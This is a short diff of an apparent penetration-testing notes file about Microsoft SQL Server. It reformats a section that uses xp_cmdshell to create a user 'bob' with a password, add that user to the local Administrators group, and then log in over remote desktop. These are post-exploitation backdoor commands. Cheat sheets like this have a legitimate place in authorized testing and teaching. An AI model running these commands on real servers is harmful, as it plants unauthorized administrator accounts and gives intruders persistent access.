@@ -73,10 +73,12 @@ go
 
 
 ##Add a new user and put them into Administrators Group
->xp_cmdshell 'net user bob password /add'
->go
->xp_cmdshell 'net localgroup Administrators bob /add'
->go
+```
+xp_cmdshell 'net user bob password /add'
+go
+xp_cmdshell 'net localgroup Administrators bob /add'
+go
+```
 
 
 Now login via remote desktop if you have access
